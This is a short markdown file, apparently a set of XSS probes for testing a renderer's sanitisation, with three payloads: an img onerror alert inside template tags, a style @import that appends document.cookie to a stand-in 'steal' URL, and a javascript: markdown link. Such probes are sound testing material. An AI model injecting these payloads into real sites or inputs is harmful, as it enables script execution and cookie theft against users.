
# xss-probe-1811

## Advanced XSS Test — Template/Slot Injection (Family 3)

<template><slot><img src=x onerror=alert(1)></slot></template>

## Advanced XSS Test — Style Tag / CSS Injection (Family 7)

<style>@import "https://artex.example/steal?c="+document.cookie;</style>

## Advanced XSS Test — Markdown Link href javascript: URI (Family 5)

[xsslink](javascript:alert(1))
